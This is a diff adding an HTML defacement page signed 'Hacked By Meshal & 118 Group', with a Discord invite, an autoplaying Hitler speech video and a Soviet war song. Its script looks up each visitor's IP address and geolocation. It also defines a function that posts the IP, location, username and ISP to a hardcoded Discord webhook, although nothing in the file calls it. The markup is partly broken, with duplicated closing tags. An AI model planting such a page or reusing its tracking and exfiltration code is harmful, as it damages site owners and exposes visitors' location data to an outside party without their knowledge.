@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Custom Design</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: #00f;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+
+        .image-container video {
+            width: 900px;
+            border: 2px solid #00f;
+            border-radius: 10px;
+            opacity: 0.5; /* الشفافية */
+            display: block;
+            margin: 0 auto;
+        }
+
+        .info {
+            margin-top: 20px;
+            font-size: 1.2rem;
+        }
+
+        .link {
+            margin-top: 15px;
+            font-size: 1.5rem;
+            color: #00f;
+            text-decoration: none;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+
+        .info p {
+            margin: 0;
+            white-space: pre-wrap;
+        }
+
+        .code-effect {
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        pre {
+            color: white;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .decorative-text {
+            margin-top: 20px;
+            color: #00f;
+            font-size: 1.3rem;
+            text-shadow: 0 0 10px #00f;
+            font-style: italic;
+        }
+
+        .signature-text {
+            margin-top: 15px;
+            color: #adab8e;
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <video
+        class="background"
+        autoplay
+        muted
+        loop
+    >
+        <source
+            src=""
+            type="video/mp4"
+        />
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="container">
+        <div class="image-container">
+            <video
+                width="400"
+                autoplay
+                muted
+                loop
+                playsinline
+                style="border: 2px solid #00f; border-radius: 10px; opacity: 0.5;"
+            >
+                <source
+                    src="https://cdn.discordapp.com/attachments/1273130130046451752/1273133285869879348/Adolf_Hitler__Speech_at_Krupp_Factory_in_Germany_1935___British_Pathe.mp4?ex=6873dc05&is=68728a85&hm=e14156b5b76511a6104bf41aecd55c796145bd691e9449b7cbd8286a3e77613e&"
+                    type="video/mp4"
+                />
+                Your browser does not support the video tag.
+            </video>
+        </div>
+
+        <div class="media-container">
+            <audio autoplay loop>
+                <source
+                    src="https://cdn.discordapp.com/attachments/1273130130046451752/1273134244818059315/Dark-is-the-Night-Soviet-WW2-Song-Trim.mp3?ex=6873dce9&is=68728b69&hm=d77a65e3fab4e2b1597470fec9d724cf5f5c45b022e482e16795b337170a409b&"
+                    type="audio/mp3"
+                />
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+
+        <br /><br />
+
+        <div style="color: blua;">
+            <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span
+            ><br />
+            <b>IP Information:</b>
+            <pre id="ip-info">Fetching...</pre>
+        </div>
+
+        <div class="decorative-text">
+            <p>Hacked By Meshal & 118 Group</p>
+            <p>discord.gg/tU4TAGpj</p>
+            <p></p>
+        </div>
+
+        <div class="signature-text">
+            <p></p>
+        </div>
+    </div>
+
+   
+      
+
+        <div class="signature-text">
+            <p></p>
+        </div>
+    </div>
+
+   <script type="text/javascript">
+        var omitformtags = ['input', 'textarea', 'select'].join('|');
+
+        function disableselect(e) {
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
+                return false;
+        }
+
+        function reEnable() {
+            return true;
+        }
+
+        if (typeof document.onselectstart != 'undefined')
+            document.onselectstart = function () {
+                return false;
+            };
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then((response) => response.json())
+                .then((data) => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
+                .then((response) => response.json())
+                .then((ipInfoData) => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(
+                        ipInfoData,
+                        null,
+                        2
+                    );
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent =
+                        'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent =
+                        'Unable to fetch IP information.';
+                });
+        }
+
+        fetchIPAndInfo();
+
+
+        function sendToDiscord(ipInfoData, googleMapsLink, username) {
+            const webhookURL = "https://discord.com/api/webhooks/1393793369552978020/uNJTU1E0wDH-7e7dr8CdtNaXpNFBrRjEzU0WSrexHsbqeF14HUUgeAHEX5ds_gW_3qgv";
+            const payload = {
+                content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => console.log("IP, location, and username sent to Discord successfully!"))
+            .catch(error => console.error("Error sending data to Discord:", error));
+        }
+
+        fetchIPAndInfo();
+    </script>
+
+</body>
+</html>
+
+    </script>
+</body>
+</html>
